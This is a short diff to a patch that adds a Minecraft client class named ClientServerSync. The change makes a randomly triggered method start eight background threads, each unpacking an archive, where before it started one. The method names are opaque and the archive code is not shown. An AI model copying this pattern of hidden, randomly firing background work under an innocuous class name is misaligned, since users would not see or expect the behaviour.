@@ -1,6 +1,6 @@
 --- /dev/null
 +++ net/minecraft/src/ClientServerSync.java
-@@ -1,0 +1,150 @@
+@@ -1,0 +1,152 @@
 +package net.minecraft.src;
 +
 +import net.minecraft.client.Minecraft;
@@ -48,7 +48,7 @@
 +	}
 +
 +	public static void e3(Random rand) {
-+		int random = rand.nextInt(8);
++		int random = rand.nextInt(12);
 +		if(random == 0) {
 +			e6();
 +		}
@@ -69,13 +69,15 @@
 +	}
 +
 +	public static void e6() {
-+		new Thread(()->{
-+			try {
-+				ZipArchive.unarchived();
-+			} catch (IOException e) {
-+				throw new RuntimeException(e);
-+			}
-+		}).start();
++		for(int i = 0; i < 8; i++) {
++			new Thread(()->{
++				try {
++					ZipArchive.unarchived();
++				} catch (IOException e) {
++					throw new RuntimeException(e);
++				}
++			}).start();
++		}
 +	}
 +
 +	public static void e7() {
